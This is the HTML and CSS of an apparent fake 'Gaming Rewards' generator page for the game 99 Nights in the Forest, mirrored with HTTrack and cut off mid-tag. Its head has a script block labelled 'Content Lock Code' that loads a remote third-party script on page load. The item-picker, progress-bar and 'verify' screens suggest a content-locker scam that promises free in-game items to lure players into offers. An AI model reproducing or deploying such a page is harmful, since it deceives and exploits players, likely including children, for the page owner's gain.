@@ -1,0 +1,1405 @@
+
+<!DOCTYPE html><html lang="en"><!-- Mirrored from nightsforest.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Sep 2025 20:04:30 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Gaming Rewards - 99 Nights in the Forest</title>
+    <!-- Content Lock Code -->
+<script type="text/javascript">
+    var GRXUB_GEh_awAFEc={"it":4543075,"key":"cbfd8"};
+</script>
+<script src="https://duw03nk63ml3f.cloudfront.net/993c222.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a2332 0%, #2c4a3d 50%, #1e3d29 100%);
+            opacity: 1;
+            z-index: -1;
+        }
+
+        /* Rain Effect */
+        .rain-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .rain-drop {
+            position: absolute;
+            width: 2px;
+            height: 20px;
+            background: linear-gradient(to bottom, transparent, rgba(173, 216, 230, 0.4), transparent);
+            animation: rainFall linear infinite;
+            opacity: 0.6;
+        }
+
+        @keyframes rainFall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.05) 0%, rgba(44, 74, 61, 0.05) 50%, rgba(30, 61, 41, 0.05) 100%);
+            min-height: 100vh;
+            padding: 0;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.08) 0%, rgba(44, 74, 61, 0.08) 100%);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(60, 179, 113, 0.05);
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Stats Section */
+        .stats-section {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(60, 179, 113, 0.1) 0%, rgba(26, 35, 50, 0.1) 100%);
+            border: 1px solid rgba(60, 179, 113, 0.2);
+            border-radius: 10px;
+            padding: 15px 20px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(60, 179, 113, 0.3);
+            border-color: rgba(60, 179, 113, 0.4);
+        }
+
+        .stat-number {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #3cb371;
+            text-shadow: 0 0 10px rgba(60, 179, 113, 0.5);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            max-width: 200px;
+            max-height: 100px;
+            width: auto;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.7);
+            border: 2px solid rgba(60, 179, 113, 0.6);
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 30px rgba(60, 179, 113, 0.4);
+        }
+
+        .logo::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #3cb371, #32cd32, #3cb371, #32cd32);
+            border-radius: 12px;
+            z-index: -1;
+            opacity: 0.3;
+            filter: blur(8px);
+            animation: logoGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes logoGlow {
+            0% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 0.6;
+                transform: scale(1.02);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .main-title {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 5px 5px 0px #1a2332, 10px 10px 20px rgba(0, 0, 0, 1);
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .main-title:hover {
+            transform: scale(1.02);
+            text-shadow: 5px 5px 0px #1a2332, 10px 10px 20px rgba(0, 0, 0, 1), 0 0 20px rgba(60, 179, 113, 0.5);
+        }
+
+        .selection-section {
+            margin-bottom: 25px;
+        }
+
+        .selection-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: nowrap;
+            align-items: center;
+        }
+
+        .selection-box {
+            width: 130px;
+            height: 150px;
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.25) 0%, rgba(44, 74, 61, 0.25) 100%);
+            border: 3px solid rgba(60, 179, 113, 0.15);
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            cursor: pointer;
+            backdrop-filter: blur(12px);
+        }
+
+        .selection-box:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 10px 30px rgba(60, 179, 113, 0.3);
+        }
+
+        .selection-box.empty {
+            border-style: dashed;
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.1) 0%, rgba(44, 74, 61, 0.1) 100%);
+        }
+
+        .selection-box.filled {
+            border-style: solid;
+            box-shadow: 0 5px 20px rgba(60, 179, 113, 0.8);
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.35) 0%, rgba(44, 74, 61, 0.35) 100%);
+        }
+
+        .selection-box .selected-icon {
+            width: 110px;
+            height: 110px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            object-fit: cover;
+            border: 3px solid #1a2332;
+            background: linear-gradient(135deg, rgba(60, 179, 113, 0.7) 0%, rgba(50, 205, 50, 0.7) 100%);
+            padding: 5px;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .selection-box .selected-icon:hover {
+            transform: scale(1.05);
+        }
+
+        .selection-box .empty-text {
+            color: rgba(255, 255, 255, 0.95);
+            font-size: 0.9em;
+            text-align: center;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 1);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            padding: 0 5px;
+        }
+
+        .selection-box:hover .empty-text {
+            color: #3cb371;
+            transform: scale(1.05);
+        }
+
+        .selection-box .remove-btn {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            width: 20px;
+            height: 20px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 12px;
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .selection-box.filled .remove-btn {
+            display: flex;
+        }
+
+        .selection-box .remove-btn:hover {
+            background: #ff0000;
+            transform: scale(1.2);
+        }
+
+        .clear-btn {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.9em;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .clear-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.6);
+        }
+
+        .input-section {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-container {
+            display: inline-flex;
+            background: rgba(26, 35, 50, 0.15);
+            border-radius: 10px;
+            padding: 8px;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(12px);
+            margin-bottom: 20px;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .input-container:hover {
+            transform: translateY(-2px);
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5), 0 5px 15px rgba(60, 179, 113, 0.2);
+        }
+
+        .player-input {
+            background: rgba(255, 255, 255, 0.98);
+            border: none;
+            padding: 12px 20px;
+            font-size: 1.1em;
+            border-radius: 8px;
+            margin-right: 10px;
+            min-width: 250px;
+            color: #333;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .player-input:focus {
+            outline: none;
+            box-shadow: 0 0 20px rgba(60, 179, 113, 0.8);
+            transform: scale(1.02);
+        }
+
+        .send-button {
+            background: linear-gradient(135deg, #3cb371 0%, #32cd32 100%);
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.1em;
+            font-weight: bold;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(60, 179, 113, 0.6);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .send-button:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 10px 30px rgba(60, 179, 113, 0.8);
+        }
+
+        .send-button:active {
+            transform: translateY(-1px) scale(1.02);
+        }
+
+        /* Items Grid */
+        .items-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin-top: 25px;
+        }
+
+        .item-card {
+            background: linear-gradient(135deg, rgba(26, 35, 50, 0.25) 0%, rgba(44, 74, 61, 0.25) 100%);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            border: 2px solid transparent;
+            backdrop-filter: blur(12px);
+        }
+
+        .item-card:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+            background: linear-gradient(135deg, rgba(44, 74, 61, 0.35) 0%, rgba(60, 179, 113, 0.35) 100%);
+            border-color: rgba(60, 179, 113, 0.5);
+        }
+
+        .item-card.selected {
+            border: 2px solid #3cb371;
+            box-shadow: 0 0 25px rgba(60, 179, 113, 0.8);
+        }
+
+        .item-icon {
+            width: 120px;
+            height: 120px;
+            border-radius: 12px;
+            object-fit: cover;
+            border: 4px solid #1a2332;
+            box-shadow: 
+                inset 0 2px 5px rgba(255, 255, 255, 0.3),
+                0 4px 15px rgba(0, 0, 0, 0.6);
+            background: linear-gradient(135deg, rgba(60, 179, 113, 0.7) 0%, rgba(50, 205, 50, 0.7) 50%, rgba(26, 35, 50, 0.7) 100%);
+            padding: 5px;
+            margin: 0 auto 15px;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .item-card:hover .item-icon {
+            transform: scale(1.05);
+            box-shadow: 
+                inset 0 2px 5px rgba(255, 255, 255, 0.3),
+                0 6px 20px rgba(60, 179, 113, 0.4);
+        }
+
+        /* Popup Styles */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .progress-popup {
+            background: linear-gradient(135deg, #1a2332, #2c4a3d);
+            padding: 35px;
+            border-radius: 18px;
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+            color: #fff;
+            font-weight: bold;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            border: 2px solid rgba(60, 179, 113, 0.3);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .progress-msg {
+            font-weight: bold;
+            font-size: 1.3rem;
+            margin-bottom: 25px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        .progress-bar-bg {
+            background: #ddd;
+            height: 28px;
+            border-radius: 14px;
+            overflow: hidden;
+            margin-bottom: 18px;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #3cb371, #32cd32, #3cb371);
+            height: 100%;
+            width: 0%;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 10px rgba(60, 179, 113, 0.6);
+        }
+
+        .progress-num {
+            margin-top: 12px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        /* Final Step Screen */
+        .final-step-screen {
+            background: linear-gradient(135deg, #1a2332, #2c4a3d);
+            padding: 35px 25px;
+            border-radius: 18px;
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+            color: #fff;
+            font-weight: 600;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            border: 2px solid rgba(60, 179, 113, 0.3);
+            position: relative;
+            overflow: hidden;
+            display: none;
+        }
+
+        .final-step-title {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #3cb371;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(60, 179, 113, 0.5);
+        }
+
+        .final-items-display {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .final-items-display img {
+            width: 85px;
+            height: 85px;
+            border-radius: 12px;
+            border: 3px solid #3cb371;
+            box-shadow: 0 6px 20px rgba(60, 179, 113, 0.5);
+            object-fit: cover;
+        }
+
+        .verification-message {
+            font-size: 1.15rem;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            color: #eee;
+        }
+
+        .verify-button {
+            background: linear-gradient(135deg, #3cb371 0%, #32cd32 100%);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 6px 25px rgba(60, 179, 113, 0.6);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .verify-button:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 10px 35px rgba(60, 179, 113, 0.8);
+        }
+
+        /* Flying Animations */
+        .flying-icon {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1000;
+            transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transform-origin: center;
+        }
+
+        .flying-icon .flying-icon-container {
+            background: linear-gradient(135deg, rgba(60, 179, 113, 0.9) 0%, rgba(50, 205, 50, 0.9) 50%, rgba(26, 35, 50, 0.9) 100%);
+            border: 4px solid #1a2332;
+            border-radius: 12px;
+            padding: 8px;
+            width: 85px;
+            height: 85px;
+            box-shadow: 
+                inset 0 2px 5px rgba(255, 255, 255, 0.3),
+                0 8px 25px rgba(60, 179, 113, 0.6);
+            position: relative;
+            animation: flyingGlow 0.5s ease-in-out;
+        }
+
+        @keyframes flyingGlow {
+            0% { 
+                box-shadow: 
+                    inset 0 2px 5px rgba(255, 255, 255, 0.3),
+                    0 8px 25px rgba(60, 179, 113, 0.6);
+                transform: scale(1);
+            }
+            50% { 
+                box-shadow: 
+                    inset 0 2px 5px rgba(255, 255, 255, 0.5),
+                    0 15px 35px rgba(60, 179, 113, 0.8);
+                transform: scale(1.1);
+            }
+            100% { 
+                box-shadow: 
+                    inset 0 2px 5px rgba(255, 255, 255, 0.3),
+                    0 8px 25px rgba(60, 179, 113, 0.6);
+                transform: scale(1);
+            }
+        }
+
+        .flying-icon .flying-icon-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(135deg, #1a2332 0%, #2c4a3d 50%, #1e3d29 100%);
+            border-radius: 14px;
+            z-index: -1;
+        }
+
+        .flying-icon .flying-item-icon {
+            width: 100%;
+            height: 100%;
+            border-radius: 8px;
+            object-fit: cover;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .item-card.flying-source {
+            animation: sourceGlow 0.5s ease-in-out;
+        }
+
+        @keyframes sourceGlow {
+            0% { 
+                transform: scale(1);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            }
+            50% { 
+                transform: scale(1.08);
+                box-shadow: 0 12px 40px rgba(60, 179, 113, 0.8);
+            }
+            100% { 
+                transform: scale(1);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        .selection-box.receiving {
+            animation: receivingPulse 0.5s ease-in-out;
+        }
+
+        @keyframes receivingPulse {
+            0% { 
+                transform: scale(1);
+                border-color: rgba(60, 179, 113, 0.15);
+            }
+            50% { 
+                transform: scale(1.08);
+                border-color: rgba(60, 179, 113, 0.8);
+                box-shadow: 0 0 30px rgba(60, 179, 113, 0.8);
+            }
+            100% { 
+                transform: scale(1);
+                border-color: rgba(60, 179, 113, 0.15);
+            }
+        }
+
+        .item-card.clicked {
+            animation: pulse 0.8s ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .stats-section {
+                gap: 15px;
+            }
+            
+            .stat-card {
+                padding: 12px 15px;
+            }
+            
+            .stat-number {
+                font-size: 1.5em;
+            }
+            
+            .container {
+                max-width: 100%;
+                margin: 0;
+                padding: 15px;
+                border-radius: 0;
+            }
+            
+            .selection-boxes {
+                gap: 5px;
+            }
+            
+            .selection-box {
+                width: 110px;
+                height: 130px;
+            }
+            
+            .selection-box .selected-icon {
+                width: 90px;
+                height: 90px;
+            }
+            
+            .selection-box .empty-text {
+                font-size: 0.8em;
+            }
+            
+            .items-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 15px;
+            }
+            
+            .item-card {
+                padding: 15px;
+            }
+            
+            .item-icon {
+                width: 80px;
+                height: 80px;
+            }
+
+            .final-items-display img {
+                width: 70px;
+                height: 70px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .stats-section {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .container {
+                padding: 10px;
+                border-radius: 0;
+                max-width: 100%;
+                margin: 0;
+            }
+            
+            .selection-boxes {
+                gap: 3px;
+                justify-content: space-around;
+            }
+            
+            .selection-box {
+                width: 95px;
+                height: 115px;
+            }
+            
+            .selection-box .selected-icon {
+                width: 75px;
+                height: 75px;
+            }
+            
+            .selection-box .empty-text {
+                font-size: 0.75em;
+            }
+            
+            .items-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+            }
+            
+            .item-card {
+                padding: 10px;
+            }
+            
+            .item-icon {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .input-container {
+                flex-direction: column;
+                gap: 10px;
+                width: 100%;
+            }
+            
+            .player-input {
+                margin-right: 0;
+                min-width: auto;
+                width: 100%;
+            }
+            
+            .send-button {
+                width: 100%;
+            }
+
+            .final-items-display img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .verify-button {
+                padding: 12px 30px;
+                font-size: 1em;
+            }
+        }
+    </style>
+<link rel="me" href="https://www.blogger.com/profile/05959907272860202789">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+<script type="text/javascript" language="javascript">
+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
+</head>
+<body>
+    <!-- Rain Effect -->
+    <div class="rain-container" id="rainContainer"><div class="rain-drop" style="left: 60.9843vw; animation-duration: 1.34989s; animation-delay: 1.3839s;"></div><div class="rain-drop" style="left: 98.6858vw; animation-duration: 1.34067s; animation-delay: 1.36193s;"></div><div class="rain-drop" style="left: 36.8729vw; animation-duration: 1.49463s; animation-delay: 1.71501s;"></div><div class="rain-drop" style="left: 13.7204vw; animation-duration: 0.81519s; animation-delay: 0.284372s;"></div><div class="rain-drop" style="left: 28.0181vw; animation-duration: 1.34174s; animation-delay: 0.0793351s;"></div><div class="rain-drop" style="left: 69.7144vw; animation-duration: 1.36371s; animation-delay: 0.270807s;"></div><div class="rain-drop" style="left: 82.4676vw; animation-duration: 1.4343s; animation-delay: 0.458472s;"></div><div class="rain-drop" style="left: 43.0631vw; animation-duration: 1.01355s; animation-delay: 1.68102s;"></div><div class="rain-drop" style="left: 61.1541vw; animation-duration: 1.18305s; animation-delay: 1.10311s;"></div><div class="rain-drop" style="left: 57.9403vw; animation-duration: 0.619715s; animation-delay: 0.817773s;"></div><div class="rain-drop" style="left: 74.5787vw; animation-duration: 0.628174s; animation-delay: 0.85817s;"></div><div class="rain-drop" style="left: 99.0749vw; animation-duration: 1.07005s; animation-delay: 0.595333s;"></div><div class="rain-drop" style="left: 39.1225vw; animation-duration: 1.31368s; animation-delay: 0.832624s;"></div><div class="rain-drop" style="left: 31.7954vw; animation-duration: 0.586436s; animation-delay: 0.717043s;"></div><div class="rain-drop" style="left: 78.574vw; animation-duration: 0.541449s; animation-delay: 0.979718s;"></div><div class="rain-drop" style="left: 17.1565vw; animation-duration: 0.989749s; animation-delay: 1.77323s;"></div><div class="rain-drop" style="left: 92.1372vw; animation-duration: 1.12036s; animation-delay: 1.16015s;"></div><div class="rain-drop" style="left: 16.9648vw; animation-duration: 1.43211s; animation-delay: 1.88587s;"></div><div class="rain-drop" style="left: 33.949vw; animation-duration: 1.31017s; animation-delay: 1.27596s;"></div><div class="rain-drop" style="left: 31.7318vw; animation-duration: 0.73619s; animation-delay: 1.60177s;"></div><div class="rain-drop" style="left: 3.41734vw; animation-duration: 1.30515s; animation-delay: 0.198812s;"></div><div class="rain-drop" style="left: 61.2523vw; animation-duration: 1.09761s; animation-delay: 1.08574s;"></div><div class="rain-drop" style="left: 7.12552vw; animation-duration: 1.16447s; animation-delay: 1.87969s;"></div><div class="rain-drop" style="left: 23.6029vw; animation-duration: 1.37321s; animation-delay: 1.52773s;"></div><div class="rain-drop" style="left: 34.6756vw; animation-duration: 1.02442s; animation-delay: 1.2938s;"></div><div class="rain-drop" style="left: 91.1454vw; animation-duration: 1.22561s; animation-delay: 0.0230838s;"></div><div class="rain-drop" style="left: 97.2132vw; animation-duration: 1.48689s; animation-delay: 1.27491s;"></div><div class="rain-drop" style="left: 21.9151vw; animation-duration: 1.35223s; animation-delay: 0.124243s;"></div><div class="rain-drop" style="left: 27.5821vw; animation-duration: 1.14719s; animation-delay: 1.72735s;"></div><div class="rain-drop" style="left: 3.38252vw; animation-duration: 0.912398s; animation-delay: 1.88167s;"></div><div class="rain-drop" style="left: 48.7472vw; animation-duration: 1.0455s; animation-delay: 1.4514s;"></div><div class="rain-drop" style="left: 62.0891vw; animation-duration: 0.774082s; animation-delay: 1.34698s;"></div><div class="rain-drop" style="left: 99.5956vw; animation-duration: 1.17522s; animation-delay: 1.49885s;"></div><div class="rain-drop" style="left: 71.2396vw; animation-duration: 1.2231s; animation-delay: 1.65659s;"></div><div class="rain-drop" style="left: 44.0112vw; animation-duration: 0.856541s; animation-delay: 1.8349s;"></div><div class="rain-drop" style="left: 12.2138vw; animation-duration: 1.31019s; animation-delay: 1.43632s;"></div><div class="rain-drop" style="left: 89.1483vw; animation-duration: 0.927782s; animation-delay: 1.92444s;"></div><div class="rain-drop" style="left: 47.3127vw; animation-duration: 0.573291s; animation-delay: 0.975225s;"></div><div class="rain-drop" style="left: 72.115vw; animation-duration: 1.39607s; animation-delay: 1.5528s;"></div><div class="rain-drop" style="left: 93.1138vw; animation-duration: 1.15375s; animation-delay: 0.593749s;"></div><div class="rain-drop" style="left: 97.3856vw; animation-duration: 0.517616s; animation-delay: 0.32882s;"></div><div class="rain-drop" style="left: 62.5252vw; animation-duration: 0.908657s; animation-delay: 0.553866s;"></div><div class="rain-drop" style="left: 62.6151vw; animation-duration: 1.01835s; animation-delay: 1.03582s;"></div><div class="rain-drop" style="left: 51.8769vw; animation-duration: 1.06572s; animation-delay: 1.69701s;"></div><div class="rain-drop" style="left: 2.50665vw; animation-duration: 0.963697s; animation-delay: 0.690781s;"></div><div class="rain-drop" style="left: 24.1243vw; animation-duration: 0.838943s; animation-delay: 0.332213s;"></div><div class="rain-drop" style="left: 0.129717vw; animation-duration: 0.830854s; animation-delay: 0.75894s;"></div><div class="rain-drop" style="left: 25.1743vw; animation-duration: 0.629213s; animation-delay: 0.781546s;"></div><div class="rain-drop" style="left: 78.4439vw; animation-duration: 0.920235s; animation-delay: 1.74946s;"></div><div class="rain-drop" style="left: 18.5234vw; animation-duration: 0.629762s; animation-delay: 0.273108s;"></div><div class="rain-drop" style="left: 56.5059vw; animation-duration: 1.13894s; animation-delay: 1.59402s;"></div><div class="rain-drop" style="left: 59.4396vw; animation-duration: 0.677151s; animation-delay: 0.191738s;"></div><div class="rain-drop" style="left: 90.4584vw; animation-duration: 0.744869s; animation-delay: 1.43293s;"></div><div class="rain-drop" style="left: 27.0285vw; animation-duration: 0.695296s; animation-delay: 0.367764s;"></div><div class="rain-drop" style="left: 28.9291vw; animation-duration: 0.626564s; animation-delay: 0.704333s;"></div><div class="rain-drop" style="left: 15.4916vw; animation-duration: 0.84192s; animation-delay: 0.235942s;"></div><div class="rain-drop" style="left: 70.8089vw; animation-duration: 1.33923s; animation-delay: 0.412353s;"></div><div class="rain-drop" style="left: 6.18427vw; animation-duration: 0.995488s; animation-delay: 0.2371s;"></div><div class="rain-drop" style="left: 20.202vw; animation-duration: 0.749537s; animation-delay: 0.810959s;"></div><div class="rain-drop" style="left: 20.644vw; animation-duration: 0.548851s; animation-delay: 0.25325s;"></div><div class="rain-drop" style="left: 52.1412vw; animation-duration: 0.888745s; animation-delay: 0.906103s;"></div><div class="rain-drop" style="left: 67.9869vw; animation-duration: 1.35364s; animation-delay: 1.80365s;"></div><div class="rain-drop" style="left: 64.5786vw; animation-duration: 0.608947s; animation-delay: 0.0579721s;"></div><div class="rain-drop" style="left: 41.4013vw; animation-duration: 1.19944s; animation-delay: 1.5548s;"></div><div class="rain-drop" style="left: 21.3486vw; animation-duration: 0.636736s; animation-delay: 1.12505s;"></div><div class="rain-drop" style="left: 7.56638vw; animation-duration: 0.536773s; animation-delay: 0.430326s;"></div><div class="rain-drop" style="left: 59.783vw; animation-duration: 1.08617s; animation-delay: 0.651103s;"></div><div class="rain-drop" style="left: 30.832vw; animation-duration: 0.52187s; animation-delay: 1.27622s;"></div><div class="rain-drop" style="left: 23.3252vw; animation-duration: 0.586402s; animation-delay: 0.697444s;"></div><div class="rain-drop" style="left: 22.8136vw; animation-duration: 0.588234s; animation-delay: 1.40867s;"></div><div class="rain-drop" style="left: 19.3434vw; animation-duration: 1.24635s; animation-delay: 0.161419s;"></div><div class="rain-drop" style="left: 19.5483vw; animation-duration: 0.944963s; animation-delay: 1.09733s;"></div><div class="rain-drop" style="left: 41.6527vw; animation-duration: 0.754332s; animation-delay: 0.255841s;"></div><div class="rain-drop" style="left: 92.5819vw; animation-duration: 0.555926s; animation-delay: 0.0692167s;"></div><div class="rain-drop" style="left: 23.1775vw; animation-duration: 1.46504s; animation-delay: 1.24266s;"></div><div class="rain-drop" style="left: 87.8164vw; animation-duration: 1.21529s; animation-delay: 1.51703s;"></div><div class="rain-drop" style="left: 15.9285vw; animation-duration: 1.47896s; animation-delay: 0.66186s;"></div><div class="rain-drop" style="left: 9.83069vw; animation-duration: 1.1668s; animation-delay: 0.713525s;"></div><div class="rain-drop" style="left: 33.1847vw; animation-duration: 0.645522s; animation-delay: 1.32997s;"></div><div class="rain-drop" style="left: 49.9586vw; animation-duration: 0.839685s; animation-delay: 0.385754s;"></div><div class="rain-drop" style="left: 65.7092vw; animation-duration: 0.755962s; animation-delay: 0.179444s;"></div><div class="rain-drop" style="left: 91.0823vw; animation-duration: 1.22924s; animation-delay: 1.27316s;"></div><div class="rain-drop" style="left: 25.9509vw; animation-duration: 1.01971s; animation-delay: 1.97427s;"></div><div class="rain-drop" style="left: 12.3339vw; animation-duration: 0.654639s; animation-delay: 0.146359s;"></div><div class="rain-drop" style="left: 2.68775vw; animation-duration: 1.40138s; animation-delay: 1.7158s;"></div><div class="rain-drop" style="left: 27.3774vw; animation-duration: 1.20992s; animation-delay: 1.0664s;"></div><div class="rain-drop" 